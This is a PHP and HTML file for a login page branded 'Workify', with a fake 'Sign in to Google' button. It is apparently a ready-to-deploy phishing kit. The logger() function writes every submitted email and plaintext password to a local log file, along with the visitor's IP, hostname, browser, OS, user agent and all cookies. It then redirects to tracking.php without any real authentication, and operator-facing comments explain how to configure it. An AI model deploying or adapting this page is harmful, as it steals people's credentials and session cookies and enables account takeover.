<?php
session_start();

//Your log folder name
$logFolderName = "335467";

if (!is_dir($logFolderName)) {
    @mkdir($logFolderName, 0755, true);
}

function getIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function getData($ip)
{
    $json = file_get_contents('http://ipinfo.io/' . $ip . '/json');
    $links = json_decode($json, true);
    return $links;
}

function getBrowser()
{
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version = "";

    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    } elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    } elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'Windows';
        if (preg_match('/NT 6.2/i', $u_agent)) {
            $platform .= ' 8';
        } elseif (preg_match('/NT 6.3/i', $u_agent)) {
            $platform .= ' 8.1';
        } elseif (preg_match('/NT 6.1/i', $u_agent)) {
            $platform .= ' 7';
        } elseif (preg_match('/NT 6.0/i', $u_agent)) {
            $platform .= ' Vista';
        } elseif (preg_match('/NT 5.1/i', $u_agent)) {
            $platform .= ' XP';
        } elseif (preg_match('/NT 5.0/i', $u_agent)) {
            $platform .= ' 2000';
        }
        if (preg_match('/WOW64/i', $u_agent) || preg_match('/x64/i', $u_agent)) {
            $platform .= ' (x64)';
        }
    }

    if (preg_match('/MSIE/i', $u_agent) && !preg_match('/Opera/i', $u_agent)) {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    } elseif (preg_match('/Firefox/i', $u_agent)) {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    } elseif (preg_match('/Chrome/i', $u_agent)) {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    } elseif (preg_match('/Safari/i', $u_agent)) {
        $bname = 'Apple Safari';
        $ub = "Safari";
    } elseif (preg_match('/Opera/i', $u_agent)) {
        $bname = 'Opera';
        $ub = "Opera";
    } elseif (preg_match('/Netscape/i', $u_agent)) {
        $bname = 'Netscape';
        $ub = "Netscape";
    }

    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
    }

    $i = count($matches['browser']);
    if ($i != 1) {
        if (strripos($u_agent, "Version") < strripos($u_agent, $ub)) {
            $version = $matches['version'][0];
        } else {
            $version = $matches['version'][1];
        }
    } else {
        $version = $matches['version'][0];
    }

    if ($version == null || $version == "") {
        $version = "?";
    }

    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
}

function logger($logFolderName)
{
    $hostname = gethostname();
    $ip   = getIP();
    $data = getData($ip);
    $ua   = getBrowser();
    // $file = fopen( $logFolderName , '/','a.log', "a");
    $file = fopen('335467/a.log', "a");
    $txt = "\nTIMESTAMP : " . date('d-m-Y H:i:s');
    $txt .= "\nEMAIL : " . $_POST['login_email'];
    $txt .= "\nPASSWORD : " . $_POST['login_password'];
    $txt .= "\nIP : " . $ip;
    $txt .= "\nHOSTNAME : " . $hostname;
    // $txt .= "\nCITY : " . $data['city'];
    // $txt .= "\nREGION : " . $data['region'];
    // $txt .= "\nCOUNTRY : " . $data['country'];
    // $txt .= "\nLOCATION : " . $data['loc'];
    // $txt .= "\nORG : ".$data['org'];
    $txt .= "\nBROWSER : " . $ua['name'] . " " . $ua['version'];
    $txt .= "\nOS : " . $ua['platform'];
    $txt .= "\nUSERAGENT : " . $ua['userAgent'];
    foreach ($_COOKIE as $key => $val) {
        $txt .= "\nCOOKIE : " . $key . " : " . $val;
    }

    //OPTIONAL - you can add your session here
    //$txt .= "\nSESSION : " . $_SESSION['userlogin'];

    $txt .= "\n";
    fwrite($file, $txt);
    fclose($file);
}

if (isset($_POST['do'])) {
    if ($_POST['do'] == 'login') {
        if (true) {
            // $msg = 'Invalid username and password';                       
            logger($logFolderName);
            header("Location: tracking.php", true, 301);
            die();
        }
        // else {
        // 	$msg = 'Wrong Answer';                        
        // }                
    } else {
        $msg = 'Invalid Request';
    }
}

$captcha_1 = rand(1, 9);
$captcha_2 = rand(1, 9);
$_SESSION['result'] = true;

?>
<!doctype html>
<html>

<head>
    <title>Login | Workify</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css">
    <!-- [if lt IE 9]> -->
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <!-- <![endif] -->
    <link rel="stylesheet" type="text/css" href="css/header.css">
    <link rel="stylesheet" type="text/css" href="css/loginform.css">

    <!--    <link rel="stylesheet" type="text/css" href="css/header.css">
    <link rel="stylesheet" type="text/css" href="css/loginform.css"> -->
    <script src="https://www.google.com/recaptcha/api.js"></script>
    <style>

    </style>
</head>

<body>
    <!-- <div class="container">
    <form class="form-signin" role="form" method="POST">
	<h2 class="form-signin-heading">Please sign in</h2>
        <?php if (isset($msg)) { ?><h4 style="color:red"><?php echo $msg; ?></h4><?php } ?>
        <input type="username" name="username" class="form-control" placeholder="Username" required autofocus>
        <input type="password" name="password" class="form-control" placeholder="Password" required>
		<input type="hidden" name="do" value="login"/>
           
		<input type="hidden" class="answer" name="answer" required>
                <div style="clear:both;"></div>
		<label class="checkbox">
		<input type="checkbox" value="remember-me"> Remember me
		</label>
        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
    </form>
</div>
 -->

    <div class="row">


        <div id="login-form" class="colm-form">

            <!-- ---------------------------------Logo ---------------------- -->
            <a href="index.php"> <img class="logo-login" src="img/logo-login.svg" alt="Logo"></a>

            <div class="form-container">


                <!-- --------------------------------Google button--------------------- -->

                <!-- <a href="; ?>"><button id="google-login-btn" type="button"
                        class="login-with-google-btn">
                        Sign in with Google
                    </button></a> -->

                <!-- --------------------------------Line OR--------------------------->
                <form id="loginForm" method="POST">
                    <div class="stage">
                        <button class="ui button google-auth__button">
                            <img class="google-auth__logo"
                                src="https://fonts.gstatic.com/s/i/productlogos/googleg/v6/24px.svg" />
                            Sign in to Google
                        </button>
                    </div>
                    <div class="dd-privacy-allow css-e1gwqt e15p7aqh1"><span class="css-8u2krs esbq1260">
                            <span role="separator" aria-orientation="horizontal">&nbsp;</span></span>
                        <div class="css-1lfd96m e15p7aqh0"><span class="css-sfm6zc e1wnkr790">or </span></div>
                    </div>
                    <label class="css-ddheu4"> Email address <span aria-hidden="true"
                            class="css-ers2ar es2vvo71">&nbsp;*</span> </label>
                    <input autocomplete="email" type="text" placeholder="" id="login-email" name="login_email" required>

                    <label class="css-ddheu4"> Password <span aria-hidden="true"
                            class="css-ers2ar es2vvo71">&nbsp;*</span>
                    </label>

                    <input type="hidden" name="do" value="login" />

                    <input autocomplete="current-password" type="password" placeholder="" id="login-password"
                        name="login_password" required>
                    <button class="btn-login" style="height: 40px; font-size: 15px">
                        <span class="hover-underline-animation"> Continue </span>
                        <svg id="arrow-horizontal" xmlns="http://www.w3.org/2000/svg" width="30" height="10"
                            viewBox="0 0 46 16" fill="#fff">
                            <path id="Path_10" data-name="Path 10"
                                d="M8,0,6.545,1.455l5.506,5.506H-30V9.039H12.052L6.545,14.545,8,16l8-8Z"
                                transform="translate(30)"></path>
                        </svg>
                    </button>

                </form>

                <!-- --------------------------------Line OR--------------------------->

                <div class="dd-privacy-allow css-e1gwqt e15p7aqh1"><span class="css-8u2krs esbq1260">
                        <span role="separator" aria-orientation="horizontal"></span></span>

                </div>


                <a href="register.php">
                    <button class="btn-new" id="switch-to-register" style=" font-size: 14px">
                        <span class="hover-underline-animation">
                            Create new account
                        </span>

                    </button>

                </a>
                <a href="index.php" style="text-decoration: none;">
                    << Back</a>
            </div>

        </div>

    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
</body>

</html>